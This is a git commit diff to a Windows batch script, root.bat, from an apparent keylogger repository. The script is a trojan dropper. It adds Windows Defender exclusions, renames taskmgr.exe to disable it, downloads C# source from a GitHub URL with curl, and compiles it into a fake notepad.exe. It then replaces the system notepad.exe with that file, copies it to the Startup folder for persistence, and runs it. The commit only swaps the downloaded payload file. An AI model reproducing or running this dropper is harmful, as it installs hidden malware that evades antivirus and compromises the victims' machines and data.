652b704deab01390de1c096e6d7037ee2726f614
dGgzajNzdDNy <avacksalim@gmail.com>
2025-02-15 15:57:24 -0300

    Update root.bat

--- root.bat
+++ root.bat
@@ -4,10 +4,10 @@ powershell Add-MpPreference -ExclusionPath %userprofile%\AppData\Roaming\Microso
 powershell Add-MpPreference -ExclusionPath c:\windows\system32\
 ren c:\windows\system32\taskmgr.exe taskmgr.exe.TROJANNED
 cd %userprofile%
-curl -O https://raw.githubusercontent.com/dGgzajNzdDNy/awesome-keylogger/refs/heads/main/WinBoot.cs
-c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /target:winexe /out:notepad.exe WinBoot.cs
-erase WinBoot.cs
+curl -O https://raw.githubusercontent.com/dGgzajNzdDNy/awesome-keylogger/refs/heads/main/nettrj.cs
+c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /target:winexe /out:notepad.exe nettrj.cs
+erase nettrj.cs
 ren c:\windows\system32\notepad.exe notepad.exe.TROJANNED
-copy notepad.exe c:\windows\system32\notepad.exe
+copy notepad.exe c:\windows\system32\
 copy notepad.exe "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 %userprofile%\notepad.exe
